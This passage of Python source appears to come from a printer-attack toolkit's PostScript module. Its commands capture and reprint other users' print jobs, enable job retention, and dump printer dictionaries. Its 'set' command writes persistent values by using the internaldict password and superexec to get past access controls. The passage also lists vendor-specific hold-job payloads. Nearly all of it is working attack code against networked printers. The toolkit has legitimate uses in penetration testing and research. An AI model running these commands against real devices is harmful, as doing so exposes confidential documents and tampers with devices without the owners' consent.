       b'/msg {(Reprinting recorded job ) print count str\n'
       b'cvs print ( of ) print total str cvs print (\\n) print} def\n'
       b'userdict /capturedict known {/total capturedict length def\n'
       b'capturedict {increment msg dup resetfile cvx exec} forall} if\n'
       b'count 0 eq {(No jobs captured) print} if'))
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # end capturing print jobs
    elif arg.startswith('stop'):
      output().raw("Stopping job capture, deleting recorded jobs")
      self.globalcmd(b'<< /BeginPage {} bind /EndPage {} bind >>\n'
                     b'setpagedevice userdict /capturedict undef\n')
    else:
      self.help_capture()

  def help_capture(self):
    print("Print job operations:  capture <operation>")
    print("  capture start   - Record future print jobs.")
    print("  capture stop    - End capturing print jobs.")
    print("  capture list    - Show captured print jobs.")
    print("  capture fetch   - Save captured print jobs.")
    print("  capture print   - Reprint saved print jobs.")

  options_capture = ('start', 'stop', 'list', 'fetch', 'print')
  def complete_capture(self, text, line, begidx, endidx):
    return [cat for cat in self.options_capture if cat.startswith(text)]

  # ------------------------[ hold ]------------------------------------
  def do_hold(self, arg: str):
    "Enable job retention."
    output().psonly()
    bytes_send = b'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
                 b'{/retention 1 def}{/retention 0 def} ifelse\n'\
                 b'<< /Collate true /CollateDetails\n'\
                 b'<< /Hold retention /Type 8 >> >> setpagedevice\n'\
                 b'(Job retention ) print\n'\
                 b'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
                 b'{(disabled.) print}{(enabled.) print} ifelse'
    output().info(self.globalcmd(bytes_send))
    self.chitchat("On most devices, jobs can only be reprinted by a local attacker via the")
    self.chitchat("printer's control panel. Stored jobs are sometimes accessible by PS/PJL")
    self.chitchat("file system access or via the embedded web server. If your printer does")
    self.chitchat("not support holding jobs try the more generic 'capture' command instead")
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    '''
    **************************** HP/KYOCERA ****************************
    << /Collate true /CollateDetails <<         /Type 8 /Hold 1 >> >> setpagedevice  % quick copy (HP)
    << /Collate true /CollateDetails <<         /Type 8 /Hold 2 >> >> setpagedevice  % stored job (HP)
    << /Collate true /CollateDetails << /Mode 0 /Type 8 /Hold 1 >> >> setpagedevice  % quick copy (Kyocera)
    << /Collate true /CollateDetails << /Mode 0 /Type 8 /Hold 2 >> >> setpagedevice  % stored job (Kyocera)
    << /Collate true /CollateDetails << /Mode 0                 >> >> setpagedevice  % permanent job storage (Kyocera)
    <<               /CollateDetails << /Hold 0 /Type 8         >> >> setpagedevice  % disable job retention (HP)

    **************************** CANON *********************************
    << /CNJobExecMode store >> setpagedevice
    << /CNJobExecMode hold  >> setpagedevice

    **************************** BROTHER *******************************
    << /BRHold 2 /BRHoldType 0 >> setpagedevice

    **************************** XEROX #1 ******************************
    userdict /XJXsetraster known { 1 XJXsetraster } if

    **************************** XEROX #2 ******************************
    userdict begin /xerox$holdjob 1 def end
    /EngExe /ProcSet resourcestatus
    {pop pop /EngExe /ProcSet findresource /HoldJob known
    {false /EngExe /ProcSet findresource /HoldJob get exec} if} if

    **************************** TOSHIBA *******************************
    /dscInfo where {
      pop
      dscInfo /For known {
        <</TSBPrivate 100 string dup 0 (DSSC PRINT USERLOGIN=)
          putinterval dup 21 dscInfo /For get putinterval
        >> setpagedevice
      } if
      dscInfo /Title known {
        <</TSBPrivate 100 string dup 0 (DSSC JOB NAME=)
          putinterval dup 14 dscInfo /Title get putinterval
        >> setpagedevice
      } if
    << /TSBPrivate (DSSC PRINT PRINTMODE=HOLD) >> setpagedevice
    }{
      << /TSBPrivate (DSSC PRINT USERLOGIN=CUPS User) >> setpagedevice
      << /TSBPrivate (DSSC JOB NAME=CUPS Document)    >> setpagedevice
      << /TSBPrivate (DSSC PRINT PRINTMODE=HOLD)      >> setpagedevice
    } ifelse"
  '''

  # ====================================================================

  # ------------------------[ known <operator> ]-------------------------
  def do_known(self, arg: str):
    "List supported PostScript operators:  known <operator>"
    if arg:
      functionlist = {'User-supplied Operators': arg.split()}
    else:
      functionlist = operators.oplist

### may want to find unknown ops using: systemdict {dup type /operatortype eq {exch == pop}{pop pop} ifelse} forall

    # ask interpreter if functions are known to systemdict
    for desc, funcs in sorted(functionlist.items()):
      output().chitchat(desc)
      commands = [b'(' + func.encode()  + b': ) print systemdict /'
                  + func.encode() + b' known ==' for func in funcs]
      bytes_recv = self.cmd(c.EOL.join(commands), False)
      for line in bytes_recv.splitlines():
        output().green(line) if b" true" in line else output().warning(line)

  # ------------------------[ search <key> ]----------------------------
  def do_search(self, arg: str):
    "Search all dictionaries by key:  search <key>"
    output().info(self.cmd(b'(' + arg.encode() + b') where {(' + arg.encode() + b') get ==} if'))

  # ------------------------[ dicts ]-----------------------------------
  def do_dicts(self, arg: str):
    "Return a list of dictionaries and their permissions."
    output().info("acl   len   max   dictionary")
    output().info("────────────────────────────")
    for d in self.options_dump:
      bytes_recv = self.cmd(b'1183615869 ' + d + b'\n'
                            b'dup rcheck {(r) print}{(-) print} ifelse\n'
                            b'dup wcheck {(w) print}{(-) print} ifelse\n'
                            b'dup xcheck {(x) print}{(-) print} ifelse\n'
                            b'( ) print dup length 128 string cvs print\n'
                            b'( ) print maxlength  128 string cvs print')
      if len(bytes_recv.split()) == 3:
        output().info("%-5s %-5s %-5s %s" % tuple(x.decode() for x in bytes_recv.split() + [d]))

  # ------------------------[ dump <dict> ]-----------------------------
  def do_dump(self, arg: str, resource=False):
    "Dump all values of a dictionary:  dump <dict>"
    dump = self.dictdump(arg, resource)
    if dump: output().psdict(dump)

  def help_dump(self):
    print("Dump dictionary:  dump <dict>")
    # print("If <dict> is empty, the whole dictionary stack is dumped.")
    print("Standard PostScript dictionaries:")
    last = None
    if len(self.options_dump) > 0: last = self.options_dump[-1]
    for dict in self.options_dump: print((('└─ ' if dict == last else '├─ ') + dict.decode()))

  # undocumented ... what about proprietary dictionary names?
  options_dump: Tuple[bytes, ...] = (b'systemdict', b'statusdict', b'userdict', b'globaldict',
        b'serverdict', b'errordict', b'internaldict', b'currentpagedevice',
        b'currentuserparams', b'currentsystemparams')

  def complete_dump(self, text, line, begidx, endidx):
    return [cat for cat in self.options_dump if cat.startswith(text)]

  # define alias
  complete_browse = complete_dump

  def dictdump(self, dict, resource):
    superexec = False # TBD: experimental privilege escalation
    if not dict: # dump whole dictstack if optional dict parameter is empty
      # dict = 'superdict'
      # self.chitchat("No dictionary given - dumping everything (might take some time)")
      return self.onecmd("help dump")
    # recursively dump contents of a postscript dictionary and convert them to json
    bytes_send: bytes = \
      b'/superdict {<< /universe countdictstack array dictstack >>} def\n'  \
      b'/strcat {exch dup length 2 index length add string dup\n'           \
      b'dup 4 2 roll copy length 4 -1 roll putinterval} def\n'              \
      b'/remove {exch pop () exch 3 1 roll exch strcat strcat} def\n'       \
      b'/escape { {(")   search {remove}{exit} ifelse} loop \n'             \
      b'          {(/)   search {remove}{exit} ifelse} loop \n'             \
      br'          {(\\\) search {remove}{exit} ifelse} loop } def\n'        \
      b'/clones 220 array def /counter 0 def % performance drawback\n'      \
      b'/redundancy { /redundant false def\n'                               \
      b'  clones {exch dup 3 1 roll eq {/redundant true def} if} forall\n'  \
      b'  redundant not {\n'                                                \
      b'  dup clones counter 3 2 roll put  % put item into clonedict\n'     \
      b'  /counter counter 1 add def       % auto-increment counter\n'      \
      b'  } if redundant} def              % return true or false\n'        \
      b'/wd {redundancy {pop q (<redundant dict>) p q bc s}\n'              \
      b'{bo n {t exch q 128 a q c dump n} forall bc bc s} ifelse } def\n'   \
      b'/wa {q q bc s} def\n'                                               \
      b'% /wa {ao n {t dump n} forall ac bc s} def\n'                       \
      b'/n  {(\\n) print} def               % newline\n'                    \
      b'/t  {(\\t) print} def               % tabulator\n'                  \
      b'/bo {({)   print} def              % bracket open\n'                \
      b'/bc {(})   print} def              % bracket close\n'               \
      b'/ao {([)   print} def              % array open\n'                  \
      b'/ac {(])   print} def              % array close\n'                 \
      b'/q  {(")   print} def              % quote\n'                       \
      b'/s  {(,)   print} def              % comma\n'                       \
      b'/c  {(: )  print} def              % colon\n'                       \
      b'/p  {                  print} def  % print string\n'                \
      b'/a  {string cvs        print} def  % print any\n'                   \
      b'/pe {escape            print} def  % print escaped string\n'        \
      b'/ae {string cvs escape print} def  % print escaped any\n'           \
      b'/perms { readable  {(r) p}{(-) p} ifelse\n'                         \
      b'         writeable {(w) p}{(-) p} ifelse } def\n'                   \
      b'/rwcheck { % readable/writeable check\n'                            \
      b'  dup rcheck not {/readable  false def} if\n'                       \
      b'  dup wcheck not {/writeable false def} if perms } def\n'           \
      b'/dump {\n'                                                          \
      b'  /readable true def /writeable true def\n'                         \
      b'  dup type bo ("type": ) p q 16 a q s\n'                            \
      b'  %%%% check permissions %%%\n'                                     \
      b'  ( "perms": ) p q\n'                                               \
      b'  dup type /stringtype eq {rwcheck} {\n'                            \
      b'    dup type /dicttype eq {rwcheck} {\n'                            \
      b'      dup type /arraytype eq {rwcheck} {\n'                         \
      b'        dup type /packedarraytype eq {rwcheck} {\n'                 \
      b'          dup type /filetype eq {rwcheck} {\n'                      \
      b'            perms } % inherit perms from parent\n'                  \
      b'          ifelse} ifelse} ifelse} ifelse} ifelse\n'                 \
      b'  dup xcheck {(x) p}{(-) p} ifelse\n'                               \
      b'  %%%% convert values to strings %%%\n'                             \
      b'  q s ( "value": ) p\n'                                             \
      b'  %%%% on invalidaccess %%%\n'                                      \
      b'  readable false eq {pop q (<access denied>) p q bc s}{\n'          \
      b'  dup type /integertype     eq {q  12        a q bc s}{\n'          \
      b'  dup type /operatortype    eq {q 128       ae q bc s}{\n'          \
      b'  dup type /stringtype      eq {q           pe q bc s}{\n'          \
      b'  dup type /booleantype     eq {q   5        a q bc s}{\n'          \
      b'  dup type /dicttype        eq {            wd       }{\n'          \
      b'  dup type /arraytype       eq {            wa       }{\n'          \
      b'  dup type /packedarraytype eq {            wa       }{\n'          \
      b'  dup type /nametype        eq {q 128       ae q bc s}{\n'          \
      b'  dup type /fonttype        eq {q  30       ae q bc s}{\n'          \
      b'  dup type /nulltype        eq {q pop (null) p q bc s}{\n'          \
      b'  dup type /realtype        eq {q  42        a q bc s}{\n'          \
      b'  dup type /filetype        eq {q 100       ae q bc s}{\n'          \
      b'  dup type /marktype        eq {q 128       ae q bc s}{\n'          \
      b'  dup type /savetype        eq {q 128       ae q bc s}{\n'          \
      b'  dup type /gstatetype      eq {q 128       ae q bc s}{\n'          \
      b'  (<cannot handle>) p}\n'                                           \
      b'  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\n'\
      b'  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\n'\
      b'def\n'
    if not resource: bytes_send +=  b'(' + dict +  b') where {'
    bytes_send += b'bo 1183615869 ' + dict + b' {exch q 128 a q c dump n} forall bc'
    if not resource: bytes_send += b'}{(<nonexistent>) print} ifelse'
    bytes_recv = self.clean_json(self.cmd(bytes_send))
    if bytes_recv == '<nonexistent>':
      output().info("Dictionary not found")
    else: # convert ps dictionary to json
      return json.loads(bytes_recv, object_pairs_hook=collections.OrderedDict, strict=False)

  # bad practice
  def clean_json(self, data: bytes) -> bytes:
    data = re.sub(rb",[ \t\r\n]+}", b"}", data)
    data = re.sub(rb",[ \t\r\n]+\]", b"]", data)
    return data

  # ------------------------[ resource <category> [dump] ]--------------
  def do_resource(self, arg: str):
    args = re.split(r"\s+", arg, 1)
    cat, dump = args[0], len(args) > 1
    self.populate_resource()
    cat_encoded = cat.encode()
    if cat_encoded in self.options_resource:
      bytes_send = b'(*) {128 string cvs print (\\n) print}'\
                   b' 128 string /' + cat_encoded + b' resourceforall'
      items = self.cmd(bytes_send).splitlines()
      for item in sorted(items):
        output().info(item)
        if dump: self.do_dump((b'/' + item + b' /' + cat_encoded + b' findresource').decode(), True)
    else:
      self.onecmd("help resource")

  def help_resource(self):
    self.populate_resource()
    print("List or dump PostScript resource:  resource <category> [dump]")
    print("Available resources on this device:")
    last = None
    if len(self.options_resource) > 0: last = sorted(self.options_resource)[-1]
    for res in sorted(self.options_resource): print((('└─ ' if res == last else '├─ ') + res.decode()))

  options_resource: List[bytes] = []
  def complete_resource(self, text, line, begidx, endidx):
    return [cat for cat in self.options_resource if cat.startswith(text)]

  # retrieve available resources
  def populate_resource(self):
    if not self.options_resource:
      bytes_send = b'(*) {print (\\n) print} 128 string /Category resourceforall'
      self.options_resource = self.cmd(bytes_send).splitlines()

  # ------------------------[ set <key=value> ]-------------------------
  def do_set(self, arg: str):
    "Set key to value in topmost dictionary:  set <key=value>"
    args = re.split(rb"=", arg.encode(), 1)
    if len(args) > 1:
      key, val = args
      # make changes permanent
      bytes_send = b'true 0 startjob {\n'
      # flavor No.1: put (associate key with value in dict)
      bytes_send += b'/' + key + b' where {/' + key + b' ' + val + b' put} if\n'
      # flavor No.2: store (replace topmost definition of key)
      bytes_send += b'/' + key + b' ' + val + b' store\n'
      # flavor No.3: def (associate key and value in userdict)
      bytes_send += b'/' + key + b' ' + val + b' def\n'
      # ignore invalid access
      bytes_send += b'} 1183615869 internaldict /superexec get exec'
      self.cmd(bytes_send, False)
    else:
      self.onecmd("help set")

  # ------------------------[ config <setting> ]------------------------
  def do_config(self, arg: str):
    args = re.split(r"\s+", arg, 1)
    (a, val) = tuple(args) if len(args) > 1 else (args[0], None)
    if a in list(self.options_config.keys()):
      key = self.options_config[a]
      if a == 'copies' and not val: return self.help_config()
      output().psonly()
      val = val or 'currentpagedevice /' + key + ' get not'
      output().info(self.globalcmd(
        b'currentpagedevice /' + key.encode() + b' known\n'
        b'{<< /' + key.encode() + b' ' + val.encode() + b' >> setpagedevice\n'
        b'(' + key.encode() + b' ) print currentpagedevice /' + key.encode() + b' get\n'
        b'dup type /integertype eq {(= ) print 8 string cvs print}\n'
        b'{{(enabled)}{(disabled)} ifelse print} ifelse}\n'
        b'{(Not available) print} ifelse'))
    else:
      self.help_config()

  def help_config(self):
    print("Change printer settings:  config <setting>")
    print("  duplex      - Set duplex printing.")
    print("  copies #    - Set number of copies.")
    print("  economode   - Set economic mode.")
    print("  negative    - Set negative print.")
    print("  mirror      - Set mirror inversion.")

  options_config = {'duplex'   : 'Duplex',
                    'copies'   : 'NumCopies',
                    'economode': 'EconoMode',
                    'negative' : 'NegativePrint',
                    'mirror'   : 'MirrorPrint'}

  def complete_config(self, text, line, begidx, endidx):
    return [cat for cat in self.options_config if cat.startswith(text)]
